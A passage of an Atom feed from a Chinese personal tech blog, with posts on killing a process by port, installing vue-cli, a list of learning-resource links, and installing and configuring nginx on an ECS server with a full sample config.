        &lt;p&gt;&lt;a href=&quot;https://github.com/Runindark/Pytorch/blob/master/chapter2/2.1.1.pytorch-basics-tensor.ipynb&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux命令</title>
    <link href="http://runindark.com/2019/04/18/linux-order/"/>
    <id>http://runindark.com/2019/04/18/linux-order/</id>
    <published>2019-04-18T01:45:07.110Z</published>
    <updated>2019-04-18T01:46:10.469Z</updated>
    
    <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""> <a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><h2 id="根据端口杀死进程"><a href="#根据端口杀死进程" class="headerlink" title="根据端口杀死进程"></a>根据端口杀死进程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo fuser -k -n tcp 80</span><br></pre></td></tr></table></figure></the></excerpt>]]></content>
    
    <summary type="html">
    
      &lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;/excerpt&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>vue-cli</title>
    <link href="http://runindark.com/2019/04/09/vue-cli/"/>
    <id>http://runindark.com/2019/04/09/vue-cli/</id>
    <published>2019-04-09T03:23:26.957Z</published>
    <updated>2019-11-04T11:45:38.191Z</updated>
    
    <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""> <p>vue-cli 安装<br><a id="more"></a></p><the rest="" of="" contents="" |="" 余下全文=""><h2 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h2><p>过程略 使用</p><blockquote><p>node -v   </p></blockquote><p>可以查看</p><h2 id="安装cnpm"><a href="#安装cnpm" class="headerlink" title="安装cnpm"></a>安装cnpm</h2><p>利用淘宝加速镜像</p><blockquote><p>npm install -g cnpm –registry=<a href="http://registry.npm.taobao.org" target="_blank" rel="noopener">http://registry.npm.taobao.org</a></p></blockquote><h2 id="安装vue-cli手脚架"><a href="#安装vue-cli手脚架" class="headerlink" title="安装vue-cli手脚架"></a>安装vue-cli手脚架</h2><blockquote><p>npm install -g vue-cli</p></blockquote><h2 id="初始化vue-cli项目"><a href="#初始化vue-cli项目" class="headerlink" title="初始化vue-cli项目"></a>初始化vue-cli项目</h2><p>利用  webpack 打包</p><blockquote><p>vue init webpack myvue</p></blockquote><h2 id="根据提示完成代码运行"><a href="#根据提示完成代码运行" class="headerlink" title="根据提示完成代码运行"></a>根据提示完成代码运行</h2><blockquote><p>cd myvue</p></blockquote><blockquote><p>cnpm install</p></blockquote><blockquote><p>cnpm run dev</p></blockquote></the></excerpt>]]></content>
    
    <summary type="html">
    
      &lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt; 

&lt;p&gt;vue-cli 安装&lt;br&gt;&lt;/p&gt;&lt;/excerpt&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>资源整合</title>
    <link href="http://runindark.com/2019/03/27/%E8%B5%84%E6%BA%90%E6%95%B4%E5%90%88/"/>
    <id>http://runindark.com/2019/03/27/资源整合/</id>
    <published>2019-03-27T11:50:36.371Z</published>
    <updated>2019-04-09T11:32:07.838Z</updated>
    
    <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""> <p>有些很好的帖子或者很好的技术文章都在这里了。<br><a id="more"></a></p><the rest="" of="" contents="" |="" 余下全文=""><h2 id="设计模式网址"><a href="#设计模式网址" class="headerlink" title="设计模式网址"></a>设计模式网址</h2><blockquote><p><a href="https://wizardforcel.gitbooks.io/design-pattern-lessons/content/" target="_blank" rel="noopener">https://wizardforcel.gitbooks.io/design-pattern-lessons/content/</a></p></blockquote><h2 id="学习路线图库"><a href="#学习路线图库" class="headerlink" title="学习路线图库"></a>学习路线图库</h2><h3 id="移动端"><a href="#移动端" class="headerlink" title="移动端"></a>移动端</h3><blockquote><p><img src="/image/资源整理/01.jpg" alt=""></p></blockquote><h3 id="企业级技能"><a href="#企业级技能" class="headerlink" title="企业级技能"></a>企业级技能</h3><blockquote><p><img src="/image/资源整理/02.jpg" alt=""></p></blockquote><h3 id="后端学习"><a href="#后端学习" class="headerlink" title="后端学习"></a>后端学习</h3><blockquote><p><img src="/image/资源整理/03.jpg" alt=""></p></blockquote><hr><blockquote><p><img src="/image/资源整理/07.png" alt=""></p></blockquote><hr><blockquote><p><a href="https://www.cnblogs.com/huaxingtianxia/p/5724093.html" target="_blank" rel="noopener">https://www.cnblogs.com/huaxingtianxia/p/5724093.html</a></p></blockquote><h3 id="前端学习"><a href="#前端学习" class="headerlink" title="前端学习"></a>前端学习</h3><blockquote><p><img src="/image/资源整理/04.jpg" alt=""><br><a href="https://github.com/LiangJunrong/document-library/blob/master/other-library/shortArticle/share/November2018.md" target="_blank" rel="noopener">https://github.com/LiangJunrong/document-library/blob/master/other-library/shortArticle/share/November2018.md</a></p></blockquote><h3 id="游戏-彩蛋-影狼"><a href="#游戏-彩蛋-影狼" class="headerlink" title="游戏(彩蛋) 影狼"></a>游戏(彩蛋) 影狼</h3><blockquote><p><a href="https://pan.baidu.com/s/1Mp3b9-D9AJc_0yEbvKV5nA" target="_blank" rel="noopener">https://pan.baidu.com/s/1Mp3b9-D9AJc_0yEbvKV5nA</a><br>提取码: jzji</p></blockquote><h3 id="hacker学习"><a href="#hacker学习" class="headerlink" title="hacker学习"></a>hacker学习</h3><blockquote><p><a href="https://www.ichunqiu.com/" target="_blank" rel="noopener">https://www.ichunqiu.com/</a></p></blockquote><blockquote><p>《网络黑白》<br>《反欺骗的艺术》</p></blockquote><h3 id="梯子"><a href="#梯子" class="headerlink" title="梯子"></a>梯子</h3><blockquote><p><a href="https://repw.github.io/2019/01/20/ssr%E6%90%AD%E5%BB%BA-%E7%A7%91%E5%AD%A6%E7%BF%BB%E5%A2%99/" target="_blank" rel="noopener">https://repw.github.io/2019/01/20/ssr%E6%90%AD%E5%BB%BA-%E7%A7%91%E5%AD%A6%E7%BF%BB%E5%A2%99/</a></p></blockquote><blockquote><p><a href="https://repw.github.io/2019/01/20/ssr搭建-科学翻墙/" target="_blank" rel="noopener">https://repw.github.io/2019/01/20/ssr搭建-科学翻墙/</a></p></blockquote><h3 id="北大学习资料"><a href="#北大学习资料" class="headerlink" title="北大学习资料"></a>北大学习资料</h3><blockquote><p><a href="https://github.com/lib-pku/libpku" target="_blank" rel="noopener">https://github.com/lib-pku/libpku</a> </p></blockquote></the></excerpt>]]></content>
    
    <summary type="html">
    
      &lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt; 

&lt;p&gt;有些很好的帖子或者很好的技术文章都在这里了。&lt;br&gt;&lt;/p&gt;&lt;/excerpt&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ECS踩坑系列之安装nginx</title>
    <link href="http://runindark.com/2019/03/26/ECS%E9%85%8D%E7%BD%AEnginx/"/>
    <id>http://runindark.com/2019/03/26/ECS配置nginx/</id>
    <published>2019-03-25T23:54:58.085Z</published>
    <updated>2019-08-07T06:45:18.584Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""> </excerpt></p><h2 id="url是什么"><a href="#url是什么" class="headerlink" title="url是什么"></a>url是什么</h2><p>只针对ecs上的nginx，不包含轻量级应用服务器<br><a id="more"></a></p><the rest="" of="" contents="" |="" 余下全文=""><h2 id="nginx简介"><a href="#nginx简介" class="headerlink" title="nginx简介"></a>nginx简介</h2><p>Nginx是一款轻量级的网页服务器、反向代理服务器。相较于Apache、lighttpd具有占有内存少，稳定性高等优势。它最常的用途是提供反向代理服务。</p><h2 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h2><p>nginx的启动需要三个包的支持</p><h3 id="SSL功能需要openssl库"><a href="#SSL功能需要openssl库" class="headerlink" title="SSL功能需要openssl库"></a>SSL功能需要openssl库</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>yum install openssl</span><br></pre></td></tr></table></figure><h3 id="gzip模块需要zlib库"><a href="#gzip模块需要zlib库" class="headerlink" title="gzip模块需要zlib库"></a>gzip模块需要zlib库</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>yum install zlib</span><br></pre></td></tr></table></figure><h3 id="rewrite模块需要pcre库"><a href="#rewrite模块需要pcre库" class="headerlink" title="rewrite模块需要pcre库"></a>rewrite模块需要pcre库</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>yum install pcre</span><br></pre></td></tr></table></figure><h3 id="安装Nginx依赖库"><a href="#安装Nginx依赖库" class="headerlink" title="安装Nginx依赖库"></a>安装Nginx依赖库</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>rpm -Uvh http://nginx.org/packages/centos/7/noarch/RPMS/nginx-release-centos-7-0.el7.ngx.noarch.rpm</span><br></pre></td></tr></table></figure><h3 id="安装nginx"><a href="#安装nginx" class="headerlink" title="安装nginx"></a>安装nginx</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>yum install nginx</span><br></pre></td></tr></table></figure><h3 id="启动nginx"><a href="#启动nginx" class="headerlink" title="启动nginx"></a>启动nginx</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>service nginx start</span><br></pre></td></tr></table></figure><h3 id="公网地址直接进行访问"><a href="#公网地址直接进行访问" class="headerlink" title="公网地址直接进行访问"></a>公网地址直接进行访问</h3><h3 id="配置信息"><a href="#配置信息" class="headerlink" title="配置信息"></a>配置信息</h3><p>CentOS安装Nginx后，安装在了<em> /etc/nginx/ </em>目录下，你可以打开<em> /etc/nginx/conf.d/default/conf </em>查看里面的配置，包括监听端口，域名和nginx访问的根目录</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p><a href="https://www.cnblogs.com/kingsonfu/p/9804131.html" target="_blank" rel="noopener">https://www.cnblogs.com/kingsonfu/p/9804131.html</a></p><h2 id="nginx常用命令-（ubuntu）"><a href="#nginx常用命令-（ubuntu）" class="headerlink" title="nginx常用命令 （ubuntu）"></a>nginx常用命令 （ubuntu）</h2><ol><li><p>重新载入配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> /usr/local/nginx/sbin/nginx -s reload</span><br></pre></td></tr></table></figure></li><li><p>启动nginx</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> /usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure></li><li><p>停用nginx</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> /usr/local/nginx/sbin/nginx -s stop</span><br></pre></td></tr></table></figure></li></ol><h2 id="nginx-配置"><a href="#nginx-配置" class="headerlink" title="nginx 配置"></a>nginx 配置</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">user  root;</span><br><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>error_log  logs/error.log;</span><br><span class="line"><span class="meta">#</span>error_log  logs/error.log  notice;</span><br><span class="line"><span class="meta">#</span>error_log  logs/error.log  info;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>pid        logs/nginx.pid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    #log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '</span><br><span class="line">    #                  '$status $body_bytes_sent "$http_referer" '</span><br><span class="line">    #                  '"$http_user_agent" "$http_x_forwarded_for"';</span><br><span class="line"></span><br><span class="line">    #access_log  logs/access.log  main;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    #keepalive_timeout  0;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    #gzip  on;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  localhost;</span><br><span class="line">        charset utf-8;</span><br><span class="line"></span><br><span class="line">        #charset koi8-r;</span><br><span class="line"></span><br><span class="line">        #access_log  logs/host.access.log  main;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            root   html;</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location /wechat/ &#123;</span><br><span class="line">            alias /root/local/user/obox/pic/ ;</span><br><span class="line">            autoindex on ;</span><br><span class="line">            autoindex_exact_size on; </span><br><span class="line">            autoindex_localtime on; </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        #error_page  404              /404.html;</span><br><span class="line"></span><br><span class="line">        # redirect server error pages to the static page /50x.html</span><br><span class="line">        #</span><br><span class="line">        error_page   500 502 503 504  /50x.html;</span><br><span class="line">        location = /50x.html &#123;</span><br><span class="line">            root   html;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # proxy the PHP scripts to Apache listening on 127.0.0.1:80</span><br><span class="line">        #</span><br><span class="line">        #location ~ \.php$ &#123;</span><br><span class="line">        #    proxy_pass   http://127.0.0.1;</span><br><span class="line">        #&#125;</span><br><span class="line"></span><br><span class="line">        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class="line">        #</span><br><span class="line">        #location ~ \.php$ &#123;</span><br><span class="line">        #    root           html;</span><br><span class="line">        #    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">        #    fastcgi_index  index.php;</span><br><span class="line">        #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</span><br><span class="line">        #    include        fastcgi_params;</span><br><span class="line">        #&#125;</span><br><span class="line"></span><br><span class="line">        # deny access to .htaccess files, if Apache's document root</span><br><span class="line">        # concurs with nginx's one</span><br><span class="line">        #</span><br><span class="line">        #location ~ /\.ht &#123;</span><br><span class="line">        #    deny  all;</span><br><span class="line">        #&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # another virtual host using mix of IP-, name-, and port-based configuration</span><br><span class="line">    #</span><br><span class="line">    #server &#123;</span><br><span class="line">    #    listen       8000;</span><br><span class="line">    #    listen       somename:8080;</span><br><span class="line">    #    server_name  somename  alias  another.alias;</span><br><span class="line"></span><br><span class="line">    #    location / &#123;</span><br><span class="line">    #        root   html;</span><br><span class="line">    #        index  index.html index.htm;</span><br><span class="line">    #    &#125;</span><br><span class="line">    #&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # HTTPS server</span><br><span class="line">    #</span><br><span class="line">    server &#123;</span><br><span class="line">        listen       443;</span><br><span class="line">        server_name  www.net-obox.com net-obox.com;</span><br><span class="line">        ssl on ;</span><br><span class="line"></span><br><span class="line">        ssl_certificate      /root/local/user/nginx/nginx-1.11.3/ssl/2618163_net-obox.com.pem;</span><br><span class="line">        ssl_certificate_key  /root/local/user/nginx/nginx-1.11.3/ssl/2618163_net-obox.com.key;</span><br><span class="line"></span><br><span class="line">        ssl_session_cache    shared:SSL:1m;</span><br><span class="line">        ssl_session_timeout  5m;</span><br><span class="line">        #设置长连接</span><br><span class="line">        keepalive_timeout 70;    </span><br><span class="line">        #减少点击劫持</span><br><span class="line">        add_header X-Frame-Options DENY;</span><br><span class="line">        #禁止服务器自动解析资源类型</span><br><span class="line">        add_header X-Content-Type-Options nosniff;</span><br><span class="line">        #防XSS攻击</span><br><span class="line">        add_header X-Xss-Protection 1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ssl_ciphers  HIGH:!aNULL:!MD5;</span><br><span class="line">        ssl_protocols       TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">        ssl_prefer_server_ciphers  on;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            root   html;</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">            proxy_pass http://118.31.120.92:8080;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        server_name www.net-obox.com net-obox.com;</span><br><span class="line"> </span><br><span class="line">        #核心代码</span><br><span class="line">        return 301 https://$server_name$request_uri;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt; &lt;/excerpt&gt;&lt;/p&gt;
&lt;h2 id=&quot;url是什么&quot;&gt;&lt;a href=&quot;#url是什么&quot; class=&quot;headerlink&quot; title=&quot;url是什么&quot;&gt;&lt;/a&gt;url是什么&lt;/h2&gt;&lt;p&gt;只针对ecs上的nginx，不包含轻量级应用服务器&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
